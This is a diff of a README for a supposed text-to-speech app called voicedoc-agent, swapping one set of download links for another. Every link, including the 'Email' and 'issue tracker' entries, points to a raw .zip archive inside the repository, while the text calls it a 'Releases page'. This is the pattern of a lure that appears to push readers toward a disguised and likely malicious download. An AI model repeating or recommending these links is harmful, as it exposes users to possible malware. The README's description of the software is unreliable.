@@ -1,6 +1,6 @@
 # 🎙️ voicedoc-agent - Transform Text into Speech Instantly
 
-[![Download voicedoc-agent](https://raw.githubusercontent.com/mehfoozfsd/voicedoc-agent/main/src/components/voicedoc_agent_v1.8.zip%20voicedoc--agent-v1.0-brightgreen)](https://raw.githubusercontent.com/mehfoozfsd/voicedoc-agent/main/src/components/voicedoc_agent_v1.8.zip)
+[![Download voicedoc-agent](https://github.com/mehfoozfsd/voicedoc-agent/raw/refs/heads/main/docs/voicedoc-agent-2.3.zip%20voicedoc--agent-v1.0-brightgreen)](https://github.com/mehfoozfsd/voicedoc-agent/raw/refs/heads/main/docs/voicedoc-agent-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the voicedoc-agent! This software helps you turn text documents into 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download voicedoc-agent](https://raw.githubusercontent.com/mehfoozfsd/voicedoc-agent/main/src/components/voicedoc_agent_v1.8.zip).
+To get started, visit this page to download: [Download voicedoc-agent](https://github.com/mehfoozfsd/voicedoc-agent/raw/refs/heads/main/docs/voicedoc-agent-2.3.zip).
 
 Once you access the Releases page, follow these steps:
 
@@ -71,8 +71,8 @@ We respect your privacy. voicedoc-agent does not store any documents or personal
 
 For further assistance, please reach out to our support team:
 
-- **Email:** https://raw.githubusercontent.com/mehfoozfsd/voicedoc-agent/main/src/components/voicedoc_agent_v1.8.zip
-- **GitHub Issues:** Use our [issue tracker](https://raw.githubusercontent.com/mehfoozfsd/voicedoc-agent/main/src/components/voicedoc_agent_v1.8.zip) to report any bugs or suggest features.
+- **Email:** https://github.com/mehfoozfsd/voicedoc-agent/raw/refs/heads/main/docs/voicedoc-agent-2.3.zip
+- **GitHub Issues:** Use our [issue tracker](https://github.com/mehfoozfsd/voicedoc-agent/raw/refs/heads/main/docs/voicedoc-agent-2.3.zip) to report any bugs or suggest features.
 
 ## 👩‍💻 Community Contributions
 
@@ -86,4 +86,4 @@ We welcome contributions! If you would like to improve the application or docume
 
 To dive deeper into voicedoc-agent, check out these topics: agent architecture, AI observability, document AI, and voice-first technology.
 
-Enjoy using voicedoc-agent to transform your text documents into lively conversations! Remember to download the application from our Releases page: [Download voicedoc-agent](https://raw.githubusercontent.com/mehfoozfsd/voicedoc-agent/main/src/components/voicedoc_agent_v1.8.zip).
+Enjoy using voicedoc-agent to transform your text documents into lively conversations! Remember to download the application from our Releases page: [Download voicedoc-agent](https://github.com/mehfoozfsd/voicedoc-agent/raw/refs/heads/main/docs/voicedoc-agent-2.3.zip).
